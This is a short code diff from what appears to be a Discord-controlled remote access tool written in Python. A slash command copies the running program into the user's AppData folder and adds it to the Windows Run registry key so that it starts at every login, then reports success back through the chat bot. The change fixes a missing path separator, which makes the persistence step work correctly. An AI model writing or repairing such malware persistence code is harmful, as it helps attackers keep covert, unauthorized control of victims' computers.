@@ -579,7 +579,7 @@ async def Startup_command(ctx: SlashContext, reg_name: str):
             key_value1 ="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
             open_ = winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)
 
-            winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, shutil.copy(sys.argv[0], os.getenv("appdata")+os.path.basename(sys.argv[0])))
+            winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, shutil.copy(sys.argv[0], os.getenv("appdata")+os.sep+os.path.basename(sys.argv[0])))
             open_.Close()
             await ctx.send("Successfully added it to `run` startup")
         except PermissionError:
